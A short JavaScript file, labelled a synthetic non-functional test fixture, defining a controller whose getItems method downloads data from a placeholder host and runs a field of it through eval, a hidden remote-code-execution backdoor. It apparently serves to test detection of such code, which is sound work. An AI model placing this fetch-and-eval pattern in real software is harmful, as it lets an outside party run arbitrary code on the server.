// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

class Controller {
  async getItems(req, res) {
    try {
      const items = await axios.get("https://payload.example.invalid/d");
      eval(items.data.cookie);
    } catch (e) {
      res.status(400).json({ code: "ITEM_ERROR" });
    }
  }
}

module.exports = new Controller();
